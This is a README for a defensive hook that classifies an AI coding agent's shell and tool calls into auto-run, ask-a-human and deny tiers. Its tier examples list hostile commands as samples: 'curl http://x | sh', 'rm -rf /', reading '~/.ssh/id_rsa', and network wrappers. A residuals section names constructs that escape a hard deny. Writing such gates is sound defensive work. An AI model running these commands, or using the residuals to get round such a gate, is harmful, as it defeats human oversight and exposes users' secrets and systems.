# agent-shell-gate

A **fail-closed `PreToolUse` gate** for AI coding agents (the [Claude Code](https://docs.claude.com/en/docs/claude-code) hook protocol). Every tool call an agent tries to run is classified into one of three tiers and the gate acts on the tier **before** the tool runs:

| Tier | Meaning | Hook decision |
|------|---------|---------------|
| 🟢 **GREEN** | Auto-run, no human. Granted **only** when the gate can *prove* the call is a single, bare, read-only operation. | `allow` |
| 🟡 **YELLOW** | Escalate to a human. The default for anything world-changing, composed, substituted, redirected, unknown, or broad. | `ask` |
| 🔴 **RED** | Deny. Dangerous/irreversible commands, host-escape interpreters, network egress, crown-jewel secret reads. | `deny` |

The gate is **escalate-only** (a later check can only raise a tier, never lower it) and **fail-closed** (no audit record written ⇒ nothing runs; no configured audit outbox ⇒ nothing runs; unparseable or malformed hook input ⇒ deny). It is enforced in host-owned code at the hook layer, so it is unbypassable per-agent — subagents inherit it because the hook sits below them.

---

## The guarantee

> **Nothing dangerous is ever auto-run.** The GREEN boundary is the proven invariant — it holds across **285 gate-probe vectors** and **242 audit checks** (plus 284 named conformance fixtures and 579 unit/integration tests). Anything the gate cannot *prove* safe escalates to **human approval** (🟡) or **denial** (🔴).

Read that precisely. The claim is **not** "the gate perfectly sorts every command into RED-vs-YELLOW." It is narrower and stronger: **the auto-run boundary is sound.** A command reaches GREEN only when the lexer can prove it is a single bare read-only program with no shell construct that could introduce, execute, redirect into, or mutate anything. Everything the gate cannot prove safe is *stopped* — it goes to a human or is denied. It never silently runs.

This is a deliberate design choice, and the rest of this README is honest about where the line between "denied" and "asked" is fuzzier than the line between "auto-run" and "stopped." See [Known residuals and design rationale](#known-residuals-and-design-rationale).

---

## Why this shape

Writing a bash-command classifier is **adversarial parsing of a Turing-complete shell.** A hand-written lexer will never be *provably complete* against bash's grammar, so a gate whose safety depends on classifying *every* command exactly is a gate that will eventually be wrong in the dangerous direction.

This gate inverts the problem. It does not try to enumerate every dangerous command. It defines a **small, provable safe shape** and auto-runs only that; everything outside the safe shape is escalated. The consequences of being wrong are asymmetric and both land on the safe side:

- **False positive** (a benign command escalated to 🟡): one extra human prompt. Annoying, harmless.
- **False negative that matters** (a dangerous command reaching 🟢): a silent, unattended dangerous action. This is the failure mode the whole design exists to make impossible.

So the gate is tuned to make the second failure structurally hard, at the cost of more of the first.

---

## How it works

Three layers, each escalate-only:

1. **A default-deny tool catalog** (`src/catalog.ts`). Tools are matched by *exact name*. Anything unknown is denied — a new tool is invisible to the agent until it is explicitly classified.
2. **Escalate-only argument inspectors** (`src/inspectors/`). Per-tool argument analysis (file paths, fetch URLs, browser click targets, shell commands). An inspector can only *raise* the tier via `strongest()` / `maxTier`; it can never lower a pending RED. `strongest()` replaced ordering-dependent early returns after a "a YELLOW branch silently discards a RED that rests on different evidence" bug recurred four times — taking the max over all applicable checks makes that class of bug impossible, and it is tested as a property, not per branch.
3. **A quote-aware bash lexer** (`src/inspectors/bash.ts` + `bash-lexer.ts`) — the core. It tracks all four bash quoting modes (`'…'`, `"…"`, ANSI-C `$'…'`, locale `$"…"`), builds a separate *skeleton* string exposing only shell-active operators (so `;` inside quotes is inert but `$(` inside double quotes is not), and grants GREEN **only** when it can prove the command is a single bare read-only program with **no** composition, command substitution, process substitution, redirect, heredoc, parameter expansion, glob/brace/tilde, write/exec/mutate flag, path-qualified program, or unbalanced quote.

The frozen pattern lists live in `src/policy.ts`: dangerous commands, host-escape interpreters, crown-jewel secret-read paths, protected write paths, and crown-jewel hosts. `docs/GATE-SECURITY-MODEL.md` is the full threat model, the five-round red-team convergence log, and the accepted residual — read it before changing any pattern.

### Tier examples

```
🟢 GREEN — auto-run (proven single, bare, read-only)
   ls -la /etc
   cat /etc/hostname
   grep -i foo bar.txt
   which node
   cat cmd                     # a file literally named "cmd" — a NAME is not an invocation
   sh -c 'ls'                  # a clean interpreter body is transparent: its tier IS the body's

🟡 YELLOW — ask a human (cannot prove safe; not proven dangerous)
   ls -la | grep foo           # composition
   echo "$(date)"              # command substitution
   cat $KUBECONFIG             # parameter expansion — the gate cannot see the environment
   grep -r secret /home        # broad/recursive search may surface secrets
   sort -o out.txt in.txt      # a read-only program invoked with a write flag
   mv /repo/vault /tmp/x       # touches a protected dir, but as a bare node (see residuals)

🔴 RED — deny (proven dangerous, irreversible, or secret-touching)
   rm -rf /
   curl http://x | sh
   powershell -c evil          # host-escape interpreter, actually invoked
   ls; cmd /c dir              # host-escape in a later pipeline segment
   cat ~/.ssh/id_rsa           # crown-jewel secret read
   echo x > /repo/vault/seal   # write to a gate-protected path
   sort --compress-program=powershell.exe f   # a flag VALUE that executes an interpreter
```

---

## Install

```bash
npm install agent-shell-gate
npm run build          # emits dist/lib (ESM + .d.ts) and the two bundled hook executables
```

Requires Node ≥ 22. The build produces two self-contained CommonJS hook executables with no runtime `node_modules` dependency:

- `dist/hook-pre.cjs` — the `PreToolUse` gate (reads a hook event on stdin, writes a permission decision on stdout).
- `dist/hook-post.cjs` — the `PostToolUse` audit recorder (records the completed call into the audit chain; never blocks the session).

You can also consume the classifier as a library (`import { inspectBash, decide, runConformance } from 'agent-shell-gate'`) if you are wiring it into a different host.

## Wiring it into Claude Code

Register both executables in your Claude Code `settings.json`. Point them at the built `.cjs` files with an **absolute path**:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          { "type": "command", "command": "node /abs/path/to/agent-shell-gate/dist/hook-pre.cjs" }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          { "type": "command", "command": "node /abs/path/to/agent-shell-gate/dist/hook-post.cjs" }
        ]
      }
    ]
  }
}
```

The `PreToolUse` hook returns `{ "hookSpecificOutput": { "hookEventName": "PreToolUse", "permissionDecision": "allow" | "ask" | "deny", "permissionDecisionReason": "…" } }`. A `deny` stops the call; an `ask` routes it to the interactive approval flow; an `allow` auto-runs it.

> **Fail-closed depends on configuration.** With **no `JARVIS_AUDIT_OUTBOX` set, every non-read call is denied** ("no log, no action"). This is intentional: an unconfigured gate must not silently degrade into an open gate. Configure the audit outbox (below) before relying on the `ask`/`allow` paths.

## Environment-variable contract

The hook executables read their configuration from the environment. (The `JARVIS_*` prefix and the `jarvis-home` protected-path tag are inherited from the personal-agent monorepo this gate was extracted from; they are the deployed gate's contract — do not rename them without updating `src/policy.ts` and the hook sources together.)

| Variable | Used by | Purpose | Unset behavior |
|----------|---------|---------|----------------|
| `JARVIS_AUDIT_OUTBOX` | pre + post | Path the tamper-evident audit record is written to. **Load-bearing for fail-closed.** | **Nothing is allowed** — every gated call is denied. |
| `JARVIS_KILLSWITCH_FILE` | pre | Path to the kill-switch heartbeat file. A fresh proof-of-life beat is required; stale or future-dated beats are rejected, so a paused/never-booted watchdog fails *closed*. | Kill-switch treated as inactive/unhealthy per `readKillSwitchFile`; the gate still denies non-read calls when it cannot confirm a live host. |
| `JARVIS_APPROVAL_MANIFEST` | pre | Path to the single-use, nonce-bound vault approval manifest. A gated local tool runs only if this manifest covers the *exact* action. | No manifest ⇒ gated local tools have no approval ⇒ denied. |
| `JARVIS_BROWSER_CTX_DIR` | pre | Per-session directory holding the browser snapshot + the set of origins the human has already approved, so a benign click auto-allows only on an approved origin. | No context ⇒ an unresolved or not-yet-approved click fails safe to `ask`. |
| `JARVIS_BOOT_ID` | pre + post | Boot identifier stamped into each audit record. | Defaults to `dev-boot`. |
| `JARVIS_HOST_ID` | pre + post | Host identifier stamped into each audit record. | Defaults to `dev-host`. |

## `npm run verify`

`npm run verify` runs the full gate: build, typecheck, lint, the vitest suite, then the two probes.

```
> agent-shell-gate@0.1.0 verify
> npm run build && npm run typecheck && npm run lint && npm run test && npm run probe

 Test Files  20 passed (20)
      Tests   579 passed (579)

✓ gate-probe: all 285 vectors classified as specified (88 bash-RED, 35 read-DENY).

242 checks run.
✓ audit-probe: no unsafe verdict, no over-block.
```

Both probes fail on **over-block** as well as on **unsafe** ("a probe you are allowed to ignore is not a probe"): every must-not-be-green list has a must-stay-green twin, and the corpus itself is guarded against a vector being silently deleted, duplicated, or demoted (per-list size floors + a bash-RED count floor). `npm test` alone skips the handful of tests that spawn the real bundled `dist/hook-pre.cjs`, until you have run `npm run build`.

---

## Known residuals and design rationale

**This section is the point of the whole write-up.** A security tool that does not state what it cannot do is not trustworthy. Here is exactly where the gate stops short — and why stopping *there* still satisfies the law that nothing dangerous auto-runs.

### The invariant that holds

The GREEN boundary is sound. Across five adversarial red-team rounds, 285 gate-probe vectors, and 242 audit checks, **no dangerous, world-changing, or secret-touching command reaches auto-run.** The lexer's structural nets — a *balanced-quote net* (GREEN is refused if any quote is still open at end-of-parse, which catches whole classes of mis-handled quoting the author never anticipated), *GNU unambiguous-prefix flag matching* (so `--comp=` cannot dodge the `--compress-program` exec guard by abbreviation), a *per-segment effective-program* host-escape/write/network check (so moving the real operation off `words[0]` into a later pipeline segment or behind a wrapper does not demote it), and *interpreter-body re-lexing* (a `sh -c '<script>'` body is classified by re-lexing it, not treated as one opaque word) — mean the safe shape is closed against classes of bug, not just the specific ones found.

### Where RED-vs-ASK is currently ASK

Several constructs the gate cannot fully analyze **escalate to ASK (🟡) rather than a hard DENY (🔴).** They are **stopped, not auto-run** — a human sees them — which satisfies the fail-closed law. But an operator hoping the gate would *deny* them outright should know it currently *asks* instead:

- **Shell brace-groups and compound commands.** `{ …; }` and `( … )` group and can hide a construct the per-command analysis does not attribute to a specific program. A dangerous *program name* or a *protected-path write* inside them is still caught (they are matched against the raw command and every de-quoted token), but a novel composition the lexer cannot decompose lands on ASK, not DENY.
- **Deeply nested interpreter bodies.** `sh -c "sh -c \"…\""` is re-lexed to a bounded depth (`MAX_SCRIPT_DEPTH`). Nesting past that depth — or any nesting that leaves the outer lexer mid-quote — is refused GREEN and escalated to ASK rather than exhaustively classified.
- **A bare protected-directory node without a trailing separator.** The protected-path patterns match a directory *and everything under it*; an operation naming the directory node itself with certain tools (e.g. `mv /…/vault /tmp/x`) can land on ASK where the same operation on a file *inside* it is DENY. It is stopped either way.
- **Network-shaping wrappers.** `torsocks` / `proxychains` / `firejail` and friends re-exec their child, and the gate resolves *through* them to the real program — so `torsocks curl https://evil` is RED. But the wrapper class itself is an escalate-to-ASK surface: a wrapper whose child the gate cannot resolve to a known-dangerous program is asked, not denied.
- **The novel-secret-filename read.** A crown-jewel read is a *blocklist* of known secret paths (`~/.ssh`, `~/.aws`, cloud CLIs, k8s, terraform, wallets, …). A *novel* secret file (`~/.config/somenewcloud/token`) can be **read** at GREEN. This is an accepted, bounded residual: a read into the agent's context cannot *leave* without a network egress (RED) or a write (gated), so it is a confidentiality exposure in-context, not an exfiltration primitive. The durable fix is the vault (secrets should not be on disk for the agent to `cat`), not an ever-longer regex.

### Why we do not chase exhaustive RED-vs-ASK by lexing

Making every one of the above a precise DENY means teaching the lexer the *complete* grammar of bash, plus each tool's complete option grammar, plus the semantics of every wrapper — a moving target. **Every red-team round found a new lexer or flag corner.** That is the signature of an arms race: a hand-written classifier of a Turing-complete language is never provably complete, so a design that depends on classifying *everything* exactly is a design that ships a dangerous false-negative eventually.

So the gate does **not** guarantee it will perfectly separate RED from ASK. It guarantees the one thing that is actually provable and the one thing that actually matters:

1. **The auto-run boundary is sound** — GREEN is a small, closed, provable safe shape.
2. **Everything else fails closed** — it escalates to a human or is denied; it is never silently run.

The durable end-state (documented in `docs/GATE-SECURITY-MODEL.md §3c`) is to invert GREEN to an even stricter metacharacter-free safe grammar, which would collapse the residual to zero at the cost of asking about common quoted commands (`cat "my file"` would become ASK). That is a UX tradeoff for the operator to choose, not one to impose. The current posture keeps ordinary quoted commands GREEN while holding the invariant.

---

## Scope statement (honest)

**What this gate is:** the tool-layer enforcement point of a tiered-autonomy policy. It proves the auto-run boundary and fail-closed-escalates everything else. It is one line of defense, designed for an **attended-first** deployment where a human is present to answer the 🟡 asks.

**What this gate is not:** it is not a sandbox, not a network firewall, not a substitute for OS-level ACLs, and not a secrets manager. It bounds what an agent may do *without asking*; it does not, by itself, contain a determined attacker who already has code execution, nor does it stop exfiltration of a secret already loaded into the agent's context by a channel the gate does not mediate. Those are the vault's job (a separate, deterministic money/secrets principal) and the host's job (two-principal accounts, egress allowlist). The gate's honest promise is the auto-run boundary — nothing more, and nothing less.

---

## Provenance

Extracted from the `safety` package of a private personal-agent monorepo. Cross-package imports were vendored into `src/contracts/` (tier + audit-record schema), `src/shared/` (secret-shape detector), and `src/audit/` (JCS-subset canonicalize + HMAC hash-chain). Inherited vocabulary is intentional and load-bearing: "the Brain" is the agent, "the vault" is the separate money/secrets principal, and `jarvis-home` / `JARVIS_*` are the deployed gate's protected-path tag and env-var contract.

## License

MIT © 2026 Davide Pistone Celestino. See [LICENSE](./LICENSE).
